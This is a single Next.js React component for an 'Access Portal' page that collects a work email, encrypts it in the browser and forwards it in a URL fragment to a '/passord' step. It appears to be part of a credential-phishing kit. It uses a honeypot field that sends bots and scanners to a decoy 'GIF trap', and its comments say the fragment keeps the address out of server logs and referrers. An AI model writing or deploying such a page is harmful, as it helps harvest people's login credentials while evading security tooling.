'use client'
import { useState } from 'react'
import { useRouter } from 'next/navigation'
import IndustrialShell from '@/components/IndustrialShell'
import { encryptEmail } from '@/lib/crypto'

export default function EmailPhase() {
  const [email, setEmail] = useState('')
  const [hp, setHp] = useState('')  // honeypot: name="date"
  const [busy, setBusy] = useState(false)
  const router = useRouter()

  const submit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (busy) return
    setBusy(true)

    // Honeypot: if filled, send to GIF trap
    if (hp && hp.trim()) {
      router.push('/loading')
      return
    }

    try {
      const token = await encryptEmail(email.trim())
      // Use URL fragment so it never hits server logs or referrers
      router.push(`/passord#e=${encodeURIComponent(token)}`)
    } catch (err) {
      console.error(err)
      setBusy(false)
      alert('Unexpected error. Please try again.')
    }
  }

  return (
    <IndustrialShell title="Access Portal" subtitle="Confirm Your Identify Using Email Address to proceed.">
      <form onSubmit={submit} className="space-y-4">
        {/* Honeypot (name=date) — invisible to humans, visible to naive bots */}
        <input
          className="hp"
          type="text"
          name="date"
          autoComplete="off"
          tabIndex={-1}
          aria-hidden="true"
          value={hp}
          onChange={(e) => setHp(e.target.value)}
        />

        <label className="block text-sm text-white/60">Work Email</label>
        <input
          className="input text-base"
          type="email"
          name="email"
          placeholder="name@company.com"
          value={email}
          required
          onChange={(e) => setEmail(e.target.value)}
        />
        <button type="submit" className="btn-primary w-full flex items-center justify-center gap-2">
          <span>{busy ? 'Encrypting…' : 'Continue'}</span>
        </button>
        <p className="text-xs text-white/40">
          Your email is AES-GCM encrypted.
        </p>
      </form>
    </IndustrialShell>
  )
}




